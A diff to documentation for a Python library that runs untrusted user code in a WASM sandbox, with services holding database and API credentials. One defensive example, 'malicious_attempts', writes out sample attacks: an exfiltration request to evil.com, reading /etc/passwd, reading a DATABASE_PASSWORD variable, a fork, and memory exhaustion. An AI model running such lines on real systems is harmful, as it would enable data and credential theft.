@@ -80,7 +80,7 @@ class DatabaseService(BaseService):
         return await self._db.query("SELECT * FROM users WHERE age >= $1", min_age)
 
 # USER CODE (untrusted - runs in WASM sandbox)
-@app.step
+@app.step(sandboxed=True)
 async def process_users(min_age: int, services=None):
     # This runs in WASM - NO direct database access
     # But can call approved service methods
@@ -145,34 +145,53 @@ The simplest sandbox example: let users write transformation logic while your in
 
 ```python
 from blazing import Blazing
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
+import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# USER CODE (untrusted - runs in WASM sandbox)
-@app.step
-async def user_transform(data: list, services=None):
-    """
-    User-provided transformation logic.
-    Runs in WASM sandbox - NO network, NO filesystem access.
-    """
-    # Pure Python computation (safe)
-    return [x * 2 for x in data if x > 0]
+    # YOUR CODE (trusted - creates sandboxed execution step)
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-# YOUR CODE (trusted - orchestrates)
-@app.workflow
-async def process_data(data: list, services=None):
-    """
-    Your workflow that calls user code safely.
-    """
-    result = await user_transform(data, services=services)
-    return {"transformed": result, "count": len(result)}
+    # USER CODE (untrusted - runs in WASM sandbox)
+    def user_transform(data):
+        """User-provided transformation logic."""
+        return [x * 2 for x in data if x > 0]
 
-await app.publish()
+    # YOUR CODE (trusted - orchestrates)
+    @app.workflow
+    async def process_data(data: list, services=None):
+        """Your workflow that calls user code safely."""
+        # Serialize user function with signing
+        serialized_func, signature = serialize_user_function(user_transform, SIGNING_KEY)
 
-# Execute
-run = await app.create_workflow_task("process_data", data=[1, -2, 3, -4, 5])
-result = await run.result()
-print(result)  # {"transformed": [2, 6, 10], "count": 3}
+        # Execute in sandbox
+        result = await execute_user_function(
+            serialized_func, signature, data,
+            services=services
+        )
+        return {"transformed": result, "count": len(result)}
+
+    await app.publish()
+
+    # Execute
+    result = await app.process_data([1, -2, 3, -4, 5]).wait_result()
+    print(result)  # {"transformed": [2, 6, 10], "count": 3}
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **Security guarantees:**
@@ -188,71 +207,90 @@ print(result)  # {"transformed": [2, 6, 10], "count": 3}
 Let user code process data while keeping database credentials safe.
 
 ```python
-from blazing import Blazing
-from blazing.base import BaseService
+from blazing import Blazing, BaseService
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
 from sqlalchemy import create_engine, text
+import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# YOUR CODE (trusted - has real database access)
-@app.service
-class DatabaseService(BaseService):
-    def __init__(self, connectors):
-        # Real database connection (user code NEVER sees this)
-        self._db = connectors.get('postgres')
+    # YOUR CODE (trusted - has real database access)
+    @app.service
+    class DatabaseService(BaseService):
+        def __init__(self, connectors):
+            # Real database connection (user code NEVER sees this)
+            self._db = connectors.get('postgres')
 
-    async def fetch_users(self, min_age: int) -> list:
-        """Fetch users from database."""
-        # ✅ Parameterized query (safe from SQL injection)
-        query = text("SELECT id, name, age FROM users WHERE age >= :min_age")
-        result = await self._db.execute(query, {"min_age": min_age})
-        return [dict(row) for row in result]
+        async def fetch_users(self, min_age: int) -> list:
+            """Fetch users from database."""
+            # ✅ Parameterized query (safe from SQL injection)
+            query = text("SELECT id, name, age FROM users WHERE age >= :min_age")
+            result = await self._db.execute(query, {"min_age": min_age})
+            return [dict(row) for row in result]
 
-    async def save_scores(self, user_scores: list):
-        """Batch update user scores."""
-        for item in user_scores:
-            query = text("UPDATE users SET score = :score WHERE id = :id")
-            await self._db.execute(query, {
-                "id": item["user_id"],
-                "score": item["score"]
-            })
-        await self._db.commit()
+        async def save_scores(self, user_scores: list):
+            """Batch update user scores."""
+            for item in user_scores:
+                query = text("UPDATE users SET score = :score WHERE id = :id")
+                await self._db.execute(query, {
+                    "id": item["user_id"],
+                    "score": item["score"]
+                })
+            await self._db.commit()
 
-# USER CODE (untrusted - runs in WASM sandbox)
-@app.step
-async def calculate_scores(min_age: int, services=None):
-    """
-    User-provided scoring logic.
-    Can call database methods but CANNOT access database directly.
-    """
-    # Fetch data via service (executes on trusted worker)
-    users = await services['DatabaseService'].fetch_users(min_age)
+    # Sandboxed execution step
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-    # Process in sandbox (NO database access)
-    user_scores = []
-    for user in users:
-        score = len(user['name']) * user['age']  # User's scoring logic
-        user_scores.append({"user_id": user['id'], "score": score})
+    # USER CODE (untrusted - runs in WASM sandbox)
+    async def calculate_scores(min_age: int, services=None):
+        """
+        User-provided scoring logic.
+        Can call database methods but CANNOT access database directly.
+        """
+        # Fetch data via service (executes on trusted worker)
+        users = await services['DatabaseService'].fetch_users(min_age)
 
-    # Save via service (executes on trusted worker)
-    await services['DatabaseService'].save_scores(user_scores)
+        # Process in sandbox (NO database access)
+        user_scores = []
+        for user in users:
+            score = len(user['name']) * user['age']  # User's scoring logic
+            user_scores.append({"user_id": user['id'], "score": score})
 
-    return {"processed": len(user_scores)}
+        # Save via service (executes on trusted worker)
+        await services['DatabaseService'].save_scores(user_scores)
 
-# YOUR CODE (trusted - orchestrates)
-@app.workflow
-async def score_users(min_age: int, services=None):
-    """Run user's scoring algorithm safely."""
-    return await calculate_scores(min_age, services=services)
+        return {"processed": len(user_scores)}
 
-await app.publish()
-```
+    # YOUR CODE (trusted - orchestrates)
+    @app.workflow
+    async def score_users(min_age: int, services=None):
+        """Run user's scoring algorithm safely."""
+        serialized_func, signature = serialize_user_function(calculate_scores, SIGNING_KEY)
+        return await execute_user_function(
+            serialized_func, signature, min_age,
+            services=services
+        )
 
-**Test it:**
-```python
-run = await app.create_workflow_task("score_users", min_age=18)
-result = await run.result()
-print(result)  # {"processed": 42}
+    await app.publish()
+
+    # Execute
+    result = await app.score_users(18).wait_result()
+    print(result)  # {"processed": 42}
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **What's protected:**
@@ -269,87 +307,106 @@ print(result)  # {"processed": 42}
 Let users integrate with external APIs while keeping API keys safe.
 
 ```python
-from blazing import Blazing
-from blazing.base import BaseService
+from blazing import Blazing, BaseService
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
 import httpx
+import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# YOUR CODE (trusted - has real API credentials)
-@app.service
-class ExternalAPIService(BaseService):
-    def __init__(self, connectors):
-        # Real API key (user code NEVER sees this)
-        self._api_key = connectors.get('api_key')
-        self._base_url = "https://api.example.com"
+    # YOUR CODE (trusted - has real API credentials)
+    @app.service
+    class ExternalAPIService(BaseService):
+        def __init__(self, connectors):
+            # Real API key (user code NEVER sees this)
+            self._api_key = connectors.get('api_key')
+            self._base_url = "https://api.example.com"
 
-    async def fetch_weather(self, city: str) -> dict:
-        """Fetch weather from external API."""
-        async with httpx.AsyncClient() as client:
-            response = await client.get(
-                f"{self._base_url}/weather/{city}",
-                headers={"Authorization": f"Bearer {self._api_key}"}
-            )
-            return response.json()
+        async def fetch_weather(self, city: str) -> dict:
+            """Fetch weather from external API."""
+            async with httpx.AsyncClient() as client:
+                response = await client.get(
+                    f"{self._base_url}/weather/{city}",
+                    headers={"Authorization": f"Bearer {self._api_key}"}
+                )
+                return response.json()
 
-    async def fetch_exchange_rate(self, from_currency: str, to_currency: str) -> float:
-        """Fetch exchange rate."""
-        async with httpx.AsyncClient() as client:
-            response = await client.get(
-                f"{self._base_url}/exchange",
-                params={"from": from_currency, "to": to_currency},
-                headers={"Authorization": f"Bearer {self._api_key}"}
-            )
-            data = response.json()
-            return data["rate"]
+        async def fetch_exchange_rate(self, from_currency: str, to_currency: str) -> float:
+            """Fetch exchange rate."""
+            async with httpx.AsyncClient() as client:
+                response = await client.get(
+                    f"{self._base_url}/exchange",
+                    params={"from": from_currency, "to": to_currency},
+                    headers={"Authorization": f"Bearer {self._api_key}"}
+                )
+                data = response.json()
+                return data["rate"]
 
-# USER CODE (untrusted - runs in WASM sandbox)
-@app.step
-async def analyze_travel_cost(city: str, budget_usd: float, services=None):
-    """
-    User-provided travel analysis.
-    Can call APIs via service but NO direct network access.
-    """
-    # Fetch data via services (execute on trusted workers)
-    weather = await services['ExternalAPIService'].fetch_weather(city)
-    exchange_rate = await services['ExternalAPIService'].fetch_exchange_rate("USD", "EUR")
+    # Sandboxed execution step
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-    # Process in sandbox
-    budget_eur = budget_usd * exchange_rate
-    temp = weather.get("temperature", 20)
+    # USER CODE (untrusted - runs in WASM sandbox)
+    async def analyze_travel_cost(city: str, budget_usd: float, services=None):
+        """
+        User-provided travel analysis.
+        Can call APIs via service but NO direct network access.
+        """
+        # Fetch data via services (execute on trusted workers)
+        weather = await services['ExternalAPIService'].fetch_weather(city)
+        exchange_rate = await services['ExternalAPIService'].fetch_exchange_rate("USD", "EUR")
 
-    # User's logic
-    recommendation = "Go!" if 15 <= temp <= 25 else "Too hot/cold"
+        # Process in sandbox
+        budget_eur = budget_usd * exchange_rate
+        temp = weather.get("temperature", 20)
 
-    return {
-        "city": city,
-        "temperature": temp,
-        "budget_usd": budget_usd,
-        "budget_eur": budget_eur,
-        "recommendation": recommendation
-    }
+        # User's logic
+        recommendation = "Go!" if 15 <= temp <= 25 else "Too hot/cold"
 
-# YOUR CODE (trusted - orchestrates)
-@app.workflow
-async def plan_trip(city: str, budget_usd: float, services=None):
-    """Run user's travel analysis safely."""
-    return await analyze_travel_cost(city, budget_usd, services=services)
+        return {
+            "city": city,
+            "temperature": temp,
+            "budget_usd": budget_usd,
+            "budget_eur": budget_eur,
+            "recommendation": recommendation
+        }
 
-await app.publish()
-```
+    # YOUR CODE (trusted - orchestrates)
+    @app.workflow
+    async def plan_trip(city: str, budget_usd: float, services=None):
+        """Run user's travel analysis safely."""
+        serialized_func, signature = serialize_user_function(analyze_travel_cost, SIGNING_KEY)
+        return await execute_user_function(
+            serialized_func, signature, city, budget_usd,
+            services=services
+        )
 
-**Test it:**
-```python
-run = await app.create_workflow_task("plan_trip", city="Paris", budget_usd=1000)
-result = await run.result()
-print(result)
-# {
-#   "city": "Paris",
-#   "temperature": 22,
-#   "budget_usd": 1000,
-#   "budget_eur": 920,
-#   "recommendation": "Go!"
-# }
+    await app.publish()
+
+    # Execute
+    result = await app.plan_trip("Paris", 1000.0).wait_result()
+    print(result)
+    # {
+    #   "city": "Paris",
+    #   "temperature": 22,
+    #   "budget_usd": 1000,
+    #   "budget_eur": 920,
+    #   "recommendation": "Go!"
+    # }
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **What's protected:**
@@ -366,82 +423,106 @@ print(result)
 Safely run different tenants' code in isolated sandboxes.
 
 ```python
-from blazing import Blazing
-from blazing.base import BaseService
+from blazing import Blazing, BaseService
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
+from sqlalchemy import text
+import json
+import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# YOUR CODE (trusted - manages tenant data)
-@app.service
-class TenantDataService(BaseService):
-    def __init__(self, connectors):
-        self._db = connectors.get('postgres')
+    # YOUR CODE (trusted - manages tenant data)
+    @app.service
+    class TenantDataService(BaseService):
+        def __init__(self, connectors):
+            self._db = connectors.get('postgres')
 
-    async def get_tenant_data(self, tenant_id: str) -> list:
-        """Fetch data for specific tenant."""
-        query = text("""
-            SELECT * FROM data
-            WHERE tenant_id = :tenant_id
-            AND deleted_at IS NULL
-        """)
-        result = await self._db.execute(query, {"tenant_id": tenant_id})
-        return [dict(row) for row in result]
-
-    async def save_tenant_results(self, tenant_id: str, results: list):
-        """Save processed results for tenant."""
-        for item in results:
+        async def get_tenant_data(self, tenant_id: str) -> list:
+            """Fetch data for specific tenant."""
             query = text("""
-                INSERT INTO results (tenant_id, data, created_at)
-                VALUES (:tenant_id, :data, NOW())
+                SELECT * FROM data
+                WHERE tenant_id = :tenant_id
+                AND deleted_at IS NULL
             """)
-            await self._db.execute(query, {
-                "tenant_id": tenant_id,
-                "data": json.dumps(item)
-            })
-        await self._db.commit()
+            result = await self._db.execute(query, {"tenant_id": tenant_id})
+            return [dict(row) for row in result]
 
-# TENANT A's CODE (untrusted - runs in WASM)
-@app.step
-async def tenant_a_transform(tenant_id: str, services=None):
-    """Tenant A's custom transformation logic."""
-    data = await services['TenantDataService'].get_tenant_data(tenant_id)
+        async def save_tenant_results(self, tenant_id: str, results: list):
+            """Save processed results for tenant."""
+            for item in results:
+                query = text("""
+                    INSERT INTO results (tenant_id, data, created_at)
+                    VALUES (:tenant_id, :data, NOW())
+                """)
+                await self._db.execute(query, {
+                    "tenant_id": tenant_id,
+                    "data": json.dumps(item)
+                })
+            await self._db.commit()
 
-    # Tenant A's processing logic
-    results = [
-        {"value": item["value"] * 2, "label": "doubled"}
-        for item in data
-    ]
+    # Sandboxed execution step
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-    await services['TenantDataService'].save_tenant_results(tenant_id, results)
-    return {"processed": len(results), "tenant": tenant_id}
+    # TENANT A's CODE (untrusted - runs in WASM)
+    async def tenant_a_transform(tenant_id: str, services=None):
+        """Tenant A's custom transformation logic."""
+        data = await services['TenantDataService'].get_tenant_data(tenant_id)
 
-# TENANT B's CODE (untrusted - runs in WASM)
-@app.step
-async def tenant_b_transform(tenant_id: str, services=None):
-    """Tenant B's custom transformation logic (different from Tenant A)."""
-    data = await services['TenantDataService'].get_tenant_data(tenant_id)
+        # Tenant A's processing logic
+        results = [
+            {"value": item["value"] * 2, "label": "doubled"}
+            for item in data
+        ]
 
-    # Tenant B's processing logic (different algorithm)
-    results = [
-        {"value": item["value"] ** 2, "label": "squared"}
-        for item in data
-    ]
+        await services['TenantDataService'].save_tenant_results(tenant_id, results)
+        return {"processed": len(results), "tenant": tenant_id}
 
-    await services['TenantDataService'].save_tenant_results(tenant_id, results)
-    return {"processed": len(results), "tenant": tenant_id}
+    # TENANT B's CODE (untrusted - runs in WASM)
+    async def tenant_b_transform(tenant_id: str, services=None):
+        """Tenant B's custom transformation logic (different from Tenant A)."""
+        data = await services['TenantDataService'].get_tenant_data(tenant_id)
 
-# YOUR CODE (trusted - routes to correct tenant code)
-@app.workflow
-async def process_tenant_data(tenant_id: str, services=None):
-    """Route to correct tenant's processing logic."""
-    if tenant_id == "tenant_a":
-        return await tenant_a_transform(tenant_id, services=services)
-    elif tenant_id == "tenant_b":
-        return await tenant_b_transform(tenant_id, services=services)
-    else:
-        raise ValueError(f"Unknown tenant: {tenant_id}")
+        # Tenant B's processing logic (different algorithm)
+        results = [
+            {"value": item["value"] ** 2, "label": "squared"}
+            for item in data
+        ]
 
-await app.publish()
+        await services['TenantDataService'].save_tenant_results(tenant_id, results)
+        return {"processed": len(results), "tenant": tenant_id}
+
+    # YOUR CODE (trusted - routes to correct tenant code)
+    @app.workflow
+    async def process_tenant_data(tenant_id: str, services=None):
+        """Route to correct tenant's processing logic."""
+        if tenant_id == "tenant_a":
+            serialized_func, signature = serialize_user_function(tenant_a_transform, SIGNING_KEY)
+        elif tenant_id == "tenant_b":
+            serialized_func, signature = serialize_user_function(tenant_b_transform, SIGNING_KEY)
+        else:
+            raise ValueError(f"Unknown tenant: {tenant_id}")
+
+        return await execute_user_function(
+            serialized_func, signature, tenant_id,
+            services=services
+        )
+
+    await app.publish()
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **Security guarantees:**
@@ -458,70 +539,92 @@ await app.publish()
 User code making concurrent service calls for performance.
 
 ```python
-from blazing import Blazing
-from blazing.base import BaseService
+from blazing import Blazing, BaseService
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
+from sqlalchemy import text
 import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# YOUR CODE (trusted - provides data access)
-@app.service
-class DataService(BaseService):
-    def __init__(self, connectors):
-        self._db = connectors.get('postgres')
+    # YOUR CODE (trusted - provides data access)
+    @app.service
+    class DataService(BaseService):
+        def __init__(self, connectors):
+            self._db = connectors.get('postgres')
 
-    async def fetch_user(self, user_id: int) -> dict:
-        """Fetch single user."""
-        query = text("SELECT * FROM users WHERE id = :id")
-        result = await self._db.execute(query, {"id": user_id})
-        return dict(result.fetchone())
+        async def fetch_user(self, user_id: int) -> dict:
+            """Fetch single user."""
+            query = text("SELECT * FROM users WHERE id = :id")
+            result = await self._db.execute(query, {"id": user_id})
+            return dict(result.fetchone())
 
-    async def fetch_orders(self, user_id: int) -> list:
-        """Fetch user's orders."""
-        query = text("SELECT * FROM orders WHERE user_id = :user_id")
-        result = await self._db.execute(query, {"user_id": user_id})
-        return [dict(row) for row in result]
+        async def fetch_orders(self, user_id: int) -> list:
+            """Fetch user's orders."""
+            query = text("SELECT * FROM orders WHERE user_id = :user_id")
+            result = await self._db.execute(query, {"user_id": user_id})
+            return [dict(row) for row in result]
 
-    async def fetch_recommendations(self, user_id: int) -> list:
-        """Fetch user's recommendations."""
-        query = text("SELECT * FROM recommendations WHERE user_id = :user_id")
-        result = await self._db.execute(query, {"user_id": user_id})
-        return [dict(row) for row in result]
+        async def fetch_recommendations(self, user_id: int) -> list:
+            """Fetch user's recommendations."""
+            query = text("SELECT * FROM recommendations WHERE user_id = :user_id")
+            result = await self._db.execute(query, {"user_id": user_id})
+            return [dict(row) for row in result]
 
-# USER CODE (untrusted - makes concurrent service calls)
-@app.step
-async def analyze_user(user_id: int, services=None):
-    """
-    User-provided analysis with concurrent service calls.
-    Runs in WASM sandbox but can call services concurrently.
-    """
-    # Fetch all data concurrently (service calls execute on trusted workers)
-    user, orders, recommendations = await asyncio.gather(
-        services['DataService'].fetch_user(user_id),
-        services['DataService'].fetch_orders(user_id),
-        services['DataService'].fetch_recommendations(user_id)
-    )
+    # Sandboxed execution step
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-    # Process in sandbox
-    total_spent = sum(order['amount'] for order in orders)
-    avg_order = total_spent / len(orders) if orders else 0
+    # USER CODE (untrusted - makes concurrent service calls)
+    async def analyze_user(user_id: int, services=None):
+        """
+        User-provided analysis with concurrent service calls.
+        Runs in WASM sandbox but can call services concurrently.
+        """
+        # Fetch all data concurrently (service calls execute on trusted workers)
+        user, orders, recommendations = await asyncio.gather(
+            services['DataService'].fetch_user(user_id),
+            services['DataService'].fetch_orders(user_id),
+            services['DataService'].fetch_recommendations(user_id)
+        )
 
-    return {
-        "user_id": user_id,
-        "name": user['name'],
-        "total_orders": len(orders),
-        "total_spent": total_spent,
-        "avg_order": avg_order,
-        "recommendations_count": len(recommendations)
-    }
+        # Process in sandbox
+        total_spent = sum(order['amount'] for order in orders)
+        avg_order = total_spent / len(orders) if orders else 0
 
-# YOUR CODE (trusted - orchestrates)
-@app.workflow
-async def user_report(user_id: int, services=None):
-    """Generate user report using user's analysis logic."""
-    return await analyze_user(user_id, services=services)
+        return {
+            "user_id": user_id,
+            "name": user['name'],
+            "total_orders": len(orders),
+            "total_spent": total_spent,
+            "avg_order": avg_order,
+            "recommendations_count": len(recommendations)
+        }
 
-await app.publish()
+    # YOUR CODE (trusted - orchestrates)
+    @app.workflow
+    async def user_report(user_id: int, services=None):
+        """Generate user report using user's analysis logic."""
+        serialized_func, signature = serialize_user_function(analyze_user, SIGNING_KEY)
+        return await execute_user_function(
+            serialized_func, signature, user_id,
+            services=services
+        )
+
+    await app.publish()
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **Performance benefits:**
@@ -538,70 +641,93 @@ Examples of malicious code that fails in the sandbox.
 
 ```python
 from blazing import Blazing
+from blazing.dynamic_code import (
+    serialize_user_function,
+    execute_signed_function,
+    create_signing_key,
+)
+import asyncio
 
-app = Blazing(, api_token="your-token")
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
 
-# USER CODE (untrusted - attempts malicious actions)
-@app.step
-async def malicious_attempts(services=None):
-    """
-    Malicious code examples - all FAIL in WASM sandbox.
-    """
+    # Sandboxed execution step
+    @app.step(sandboxed=True)
+    async def execute_user_function(serialized_func: str, signature: str, *args, services=None, **kwargs):
+        """Execute user-provided code in WASM sandbox."""
+        return await execute_signed_function(
+            serialized_func, signature, args=args, kwargs=kwargs,
+            signing_key=SIGNING_KEY, validate_bytecode=True,
+        )
 
-    # ❌ ATTEMPT 1: Network exfiltration
-    try:
-        import httpx
-        # This import FAILS - httpx not available in WASM
-        await httpx.get("http://evil.com/exfiltrate")
-    except ImportError:
-        pass  # httpx not available in sandbox
+    # USER CODE (untrusted - attempts malicious actions)
+    async def malicious_attempts(services=None):
+        """
+        Malicious code examples - all FAIL in WASM sandbox.
+        """
 
-    # ❌ ATTEMPT 2: Read secrets from filesystem
-    try:
-        with open('/etc/passwd') as f:
-            secrets = f.read()
-    except (FileNotFoundError, OSError):
-        pass  # No filesystem access in sandbox
+        # ❌ ATTEMPT 1: Network exfiltration
+        try:
+            import httpx
+            # This import FAILS - httpx not available in WASM
+            await httpx.get("http://evil.com/exfiltrate")
+        except ImportError:
+            pass  # httpx not available in sandbox
 
-    # ❌ ATTEMPT 3: Spawn process
-    try:
-        import subprocess
-        subprocess.run(['ls', '/'])
-    except (ImportError, FileNotFoundError):
-        pass  # subprocess not available in sandbox
+        # ❌ ATTEMPT 2: Read secrets from filesystem
+        try:
+            with open('/etc/passwd') as f:
+                secrets = f.read()
+        except (FileNotFoundError, OSError):
+            pass  # No filesystem access in sandbox
 
-    # ❌ ATTEMPT 4: Access environment variables
-    try:
-        import os
-        api_key = os.getenv('DATABASE_PASSWORD')
-    except Exception:
-        pass  # No access to host environment
+        # ❌ ATTEMPT 3: Spawn process
+        try:
+            import subprocess
+            subprocess.run(['ls', '/'])
+        except (ImportError, FileNotFoundError):
+            pass  # subprocess not available in sandbox
 
-    # ❌ ATTEMPT 5: Fork bomb
-    try:
-        import os
-        os.fork()
-    except (ImportError, AttributeError):
-        pass  # os.fork() not available in WASM
+        # ❌ ATTEMPT 4: Access environment variables
+        try:
+            import os
+            api_key = os.getenv('DATABASE_PASSWORD')
+        except Exception:
+            pass  # No access to host environment
 
-    # ❌ ATTEMPT 6: Memory exhaustion
-    try:
-        # WASM heap limited to 512MB - will crash sandbox, not host
-        data = []
-        while True:
-            data.append("x" * 1024 * 1024)  # 1MB strings
-    except MemoryError:
-        pass  # WASM heap limit reached
+        # ❌ ATTEMPT 5: Fork bomb
+        try:
+            import os
+            os.fork()
+        except (ImportError, AttributeError):
+            pass  # os.fork() not available in WASM
 
-    return {"message": "All attacks blocked by sandbox"}
+        # ❌ ATTEMPT 6: Memory exhaustion
+        try:
+            # WASM heap limited to 512MB - will crash sandbox, not host
+            data = []
+            while True:
+                data.append("x" * 1024 * 1024)  # 1MB strings
+        except MemoryError:
+            pass  # WASM heap limit reached
 
-# YOUR CODE (trusted - orchestrates)
-@app.workflow
-async def test_security(services=None):
-    """Test that malicious code is blocked."""
-    return await malicious_attempts(services=services)
+        return {"message": "All attacks blocked by sandbox"}
 
-await app.publish()
+    # YOUR CODE (trusted - orchestrates)
+    @app.workflow
+    async def test_security(services=None):
+        """Test that malicious code is blocked."""
+        serialized_func, signature = serialize_user_function(malicious_attempts, SIGNING_KEY)
+        return await execute_user_function(
+            serialized_func, signature,
+            services=services
+        )
+
+    await app.publish()
+
+if __name__ == "__main__":
+    asyncio.run(main())
 ```
 
 **Security guarantees:**
@@ -707,6 +833,7 @@ Monitor sandboxed operations and service calls.
 
 ```python
 import logging
+import time
 
 logger = logging.getLogger(__name__)
 
@@ -743,6 +870,57 @@ class MonitoredDataService(BaseService):
 - Failed service calls (detect malicious inputs)
 - Worker type distribution (ensure proper routing)
 - Sandbox startup time (Pyodide WASM initialization)
+
+---
+
+## Alternative Approach: run_sandboxed()
+
+For simpler use cases where you don't need serialization, you can use `run_sandboxed()` directly:
+
+```python
+from blazing import Blazing
+from blazing.dynamic_code import run_sandboxed, create_signing_key
+import asyncio
+
+async def main():
+    app = Blazing(api_url="http://localhost:8000", api_token="your-token")
+    SIGNING_KEY = create_signing_key()
+
+    @app.workflow
+    async def execute_user_code(user_code: str, data: list, services=None):
+        """Execute user-provided code string directly."""
+        result = await run_sandboxed(
+            user_code,
+            data,
+            signing_key=SIGNING_KEY,
+            services=services
+        )
+        return result
+
+    await app.publish()
+
+    # User submits code as string
+    USER_CODE = """
+def transform(data, services=None):
+    return [x * 2 for x in data if x > 0]
+"""
+
+    result = await app.execute_user_code(USER_CODE, [1, -2, 3, -4, 5]).wait_result()
+    print(result)  # [2, 6, 10]
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+**When to use `run_sandboxed()`:**
+- Simple code execution without pre-serialization
+- User submits code as strings (not functions)
+- Prototyping and testing
+
+**When to use `@app.step(sandboxed=True)` with `execute_signed_function()`:**
+- Production systems requiring cryptographic verification
+- Pre-validated and serialized functions
+- Maximum security with signature validation
 
 ---
 
